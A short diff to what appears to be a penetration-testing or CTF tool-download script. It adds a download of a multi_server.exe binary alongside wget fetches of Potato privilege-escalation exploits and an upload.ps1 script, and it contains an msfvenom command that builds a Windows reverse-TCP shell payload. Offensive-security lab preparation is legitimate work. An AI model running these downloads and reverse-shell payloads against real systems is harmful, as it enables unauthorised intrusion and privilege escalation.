@@ -22,6 +22,7 @@
 # - JuicyPotatoNG
 # - RottenPotato
 # - SharpEfsPotato
+# - multi_server.exe
 # - upload.ps1
 # - met.exe
 
@@ -75,6 +76,7 @@ wget https://github.com/ohpe/juicy-potato/releases/download/v0.1/JuicyPotato.exe
 wget https://github.com/antonioCoco/JuicyPotatoNG/releases/download/v1.1/JuicyPotatoNG.zip
 unzip JuicyPotatoNG.zip
 
+wget https://github.com/adann0/multi_server/releases/download/v0.0.1/multi_server.exe
 wget https://raw.githubusercontent.com/adann0/multi_server/main/upload.ps1
 
 msfvenom -p windows/shell/reverse_tcp LHOST='tun0' LPORT=443 -f exe > met.exe
